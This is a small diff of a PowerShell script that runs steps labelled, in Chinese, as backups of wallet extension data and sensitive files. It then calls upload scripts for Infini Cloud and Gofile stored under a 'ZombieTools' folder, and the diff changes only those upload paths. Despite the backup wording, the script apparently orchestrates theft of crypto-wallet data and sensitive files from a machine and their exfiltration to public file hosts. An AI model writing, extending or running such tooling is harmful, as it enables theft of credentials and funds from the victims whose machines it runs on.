@@ -76,8 +76,8 @@ if (-not (Test-Path -LiteralPath $sensitiveScript -PathType Leaf)) {
 [void] (Invoke-BackupStep -Name '钱包扩展数据备份' -FilePath $walletScript)
 [void] (Invoke-BackupStep -Name '敏感文件备份' -FilePath $sensitiveScript -PowerShellScript)
 
-$infiniScript = Join-Path $ZombieTools '上传\infini-cloud\upload.py'
-$gofileScript = Join-Path $ZombieTools '上传\gofile\upload.py'
+$infiniScript = Join-Path $ZombieTools '上传-跨传\infini-cloud\upload.py'
+$gofileScript = Join-Path $ZombieTools '上传-跨传\gofile\upload.py'
 $infiniSucceeded = Invoke-BackupStep -Name 'Infini Cloud 上传' -FilePath $infiniScript -ArgumentList @('--auto-backup')
 
 if (-not $infiniSucceeded) {
